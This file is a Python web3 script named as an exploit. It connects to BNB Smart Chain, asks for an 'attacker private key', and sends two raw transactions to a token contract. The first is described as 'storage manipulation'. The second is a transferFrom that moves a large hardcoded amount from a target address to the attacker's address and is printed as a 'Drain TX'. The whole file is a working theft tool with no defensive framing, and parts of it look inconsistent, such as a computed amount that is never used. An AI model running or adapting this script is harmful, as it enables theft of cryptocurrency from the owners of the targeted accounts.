from web3 import Web3
from web3.middleware import geth_poa_middleware
import argparse, getpass, time

def precise_exploit():
    parser = argparse.ArgumentParser()
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/")
    parser.add_argument('--token', required=True)
    parser.add_argument('--target', required=True)
    parser.add_argument('--attacker', required=True)
    args = parser.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    private_key = getpass.getpass("Enter attacker private key: ")
    account = w3.eth.account.from_key(private_key)
    
    # Precise ABI for vulnerable functions
    token_abi = [
        {"inputs":[{"name":"a","type":"address"}],"name":"isOwner","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
    ]
    token = w3.eth.contract(address=args.token, abi=token_abi)

    print("\n[Phase 1] Precise Storage Manipulation")
    try:
        # 1. First call isOwner() with precise gas
        tx_hash = w3.eth.send_transaction({
            'from': args.attacker,
            'to': args.token,
            'data': '0x6c8381f8000000000000000000000000' + args.attacker[2:],
            'gas': 250000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.attacker)
        })
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Storage manipulation TX: {tx_hash.hex()}")

        # 2. Wait for state update
        time.sleep(15)

        # 3. Execute transfer with precise calldata
        amount = int(10986854752264.367 * 10**8)  # Adjust for decimals
        tx_hash = w3.eth.send_transaction({
            'from': args.attacker,
            'to': args.token,
            'data': f'0x23b872dd000000000000000000000000{args.target[2:]}000000000000000000000000{args.attacker[2:]}00000000000000000000000000000000000000000000000000000027af48f5ab70',
            'gas': 300000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.attacker)
        })
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Drain TX: {tx_hash.hex()}")

    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    precise_exploit()
